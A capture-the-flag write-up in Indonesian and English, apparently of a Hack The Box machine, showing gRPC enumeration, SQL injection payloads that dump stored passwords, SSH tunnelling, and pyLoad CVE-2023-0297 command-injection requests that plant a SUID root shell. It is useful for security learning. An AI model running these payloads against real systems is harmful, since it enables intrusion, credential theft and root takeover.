
## Nmap Scan Report for 10.10.11.214

**Start Time:** 2024-06-17 19:59 WIB
**Scan Duration:** 13.18 seconds

| Port      | State | Service | Version                                                      | SSH Host Key                                                                                                                                                                            |
| --------- | ----- | ------- | ------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 22/tcp    | open  | ssh     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | RSA: 3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef<br>ECDSA: 256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de<br>ED25519: 256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c |
| 50051/tcp | open  | grpc    | -                                                            | -                                                                                                                                                                                       |

**Service Detection:**
* OS: Linux
* CPE: cpe:/o:linux:linux_kernel

**Notes:**
* Service detection is performed by Nmap. Please report any incorrect results at https://nmap.org/submit/.


#### Mencari kerentanan

1. mendownload grpcurl untuk sebagai ganti nya curl 

## grpcurl Output

**Command:** 
```bash
grpcurl -plaintext 10.10.11.214:50051 list
```

**Services:**

* SimpleApp
* grpc.reflection.v1alpha.ServerReflection


## grpcurl Interaction with SimpleApp on 10.10.11.214:50051

**Services Listed:**

* SimpleApp
* grpc.reflection.v1alpha.ServerReflection

**Available RPCs for SimpleApp:**

* `LoginUser` (`.LoginUserRequest` -> `.LoginUserResponse`)
* `RegisterUser` (`.RegisterUserRequest` -> `.RegisterUserResponse`)
* `getInfo` (`.getInfoRequest` -> `.getInfoResponse`)

**Message Descriptions:**

* `.LoginUserRequest`
  * `username` (string): Username for login
  * `password` (string): Password for login
* `.LoginUserResponse`
  * `message` (string): Response message from server (e.g., "Login unsuccessful")
* `.RegisterUserRequest`
  * `username` (string): Username for registration
  * `password` (string): Password for registration
* `.RegisterUserResponse`
  * `message` (string): Response message from server (e.g., "User Already Exists!", "Account created for user...!")
* `.getInfoRequest`
  * `id` (string): User ID for information retrieval
* `.getInfoResponse`
  * `message` (string): Response message from server (e.g., "Authorization Error.Missing 'token' header")

**Interaction Examples:**

1. **Login Attempt (unsuccessful):**


**Command:** 
```bash
grpcurl -plaintext -d '{ "username": "admin123", "password": "admin123" }' 10.10.11.214:50051 SimpleApp.LoginUser
```

 **Response:**  
 ```json
 { "message": "Your id is 392." }
```

**Command:** grpcurl -v  -plaintext -d '{ "username": "admin123", "password": "admin123" }' 10.10.11.214:50051 SimpleApp.LoginUser

**Response:**
```json

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Response contents:
{
  "message": "Your id is 403."
}

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4xMjMiLCJleHAiOjE3MTg2NDAxNjN9.yzh9nNTe79t9JRD_wfEg3nE7-p7IMJ6C1177i8GP8bI'
Sent 1 request and received 1 response

```


**Command:** 
```bash
grpcurl -v -plaintext -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4xMjMiLCJleHAiOjE3MTg2NDAxNjN9.yzh9nNTe79t9JRD_wfEg3nE7-p7IMJ6C1177i8GP8bI" -d '{ "id": "1" }' 10.10.11.214:50051 SimpleApp.getInfo
```

**Response:**
```json
 
Resolved method descriptor:
rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );

Request metadata to send:
token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4xMjMiLCJleHAiOjE3MTg2NDAxNjN9.yzh9nNTe79t9JRD_wfEg3nE7-p7IMJ6C1177i8GP8bI

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Response contents:
{
  "message": "The admin is working hard to fix the issues."
}

Response trailers received:
(empty)
Sent 1 request and received 1 response

```

#### SQL Injection
1. terdapat sql injection pada query getInfo di bagaian request id nya, contoh payload nya :

   ```bash
   1 union select sqlite_version()
```

**Command:**
```bash
grpcurl -d 'id: "320 union select group_concat(tbl_name) from sqlite_master where type=\"table\" and tbl_name NOT LIKE \"sqlite_%\""' -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4xMjMiLCJleHAiOjE3MTg2NDAxNjN9.yzh9nNTe79t9JRD_wfEg3nE7-p7IMJ6C1177i8GP8bI" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
```
**Response:**
```json
message: "accounts,messages"
```

#### check structure table

**Command:**
```bash
grpcurl -d 'id: "320 union select group_concat(sql) from sqlite_master where type!=\"meta\" and sql NOT NULL and name =\"accounts\""' -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4xMjMiLCJleHAiOjE3MTg2NDAxNjN9.yzh9nNTe79t9JRD_wfEg3nE7-p7IMJ6C1177i8GP8bI" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
```

**Response:**
```json
message: "CREATE TABLE \"accounts\" (\n\tusername TEXT UNIQUE,\n\tpassword TEXT\n)"
```

##### Select 

**Command**
```bash
grpcurl -d 'id: "320 union select group_concat(username || \":\" || password ) from accounts"' -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4xMjMiLCJleHAiOjE3MTg2NDAxNjN9.yzh9nNTe79t9JRD_wfEg3nE7-p7IMJ6C1177i8GP8bI" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
```

**Response:**
```json
message: "admin:admin,sau:HereIsYourPassWord1431"
```

##### Mendapatkan user flag dan root flag

###### User flag

```bash
ssh sau@10.10.11.214 -> passsword : HereIsYourPassWord1431
```


###### Root flag

###### enum

```bash
netstat -a
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:8000          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN     
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp        0    208 10.10.11.214:ssh        10.10.14.22:54552       ESTABLISHED
tcp        0      0 10.10.11.214:ssh        10.10.14.22:54552       ESTABLISHED
tcp6       0      0 [::]:50051              [::]:*                  LISTEN     
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
tcp6       0      0 10.10.11.214:50051      10.10.14.22:50546       ESTABLISHED
udp        0      0 localhost:domain        0.0.0.0:*                          
udp        0      0 0.0.0.0:bootpc          0.0.0.0:*                          

```
di sini saya curiga dengan port 8000 maka dari itu saya mencoba dengan port tunnling 

###### port tunnling
```bash
 ssh -L  8000:localhost:8000 sau@10.10.11.214
```

![[Screenshot_2024-06-17_21-30-31.png]]
dan ternyata ada web panel tersendiri dengan menggunakan pyload, setelah saya cari vuln di google ternyata ada command injection **CVE-2023-0297**
[refrensi exploit](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad)

```bash
curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/pwnd\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
```
setelah menjalankan code di atas, betapa beruntung nya bahwa dia berjalan di atas root 

```bash
-rw-r--r--  1 root root    0 Jun 17 14:11 pwnd
```

###### Mendapatkan root flag

```bash
curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/shell\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
```

```bash
curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"cp%20/bin/bash%20/tmp/shell; chmod%206777%20/tmp/shell\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
```


setelah menjalankkan code di atas giliran menjalankan

```bash
./shell -p
```

```bash
shell-5.0# id
uid=1001(sau) gid=1001(sau) euid=0(root) egid=0(root) groups=0(root),1001(sau)
shell-5.0# cat /root/root.txt
a896e1a01e7129a25b1054370090f881
```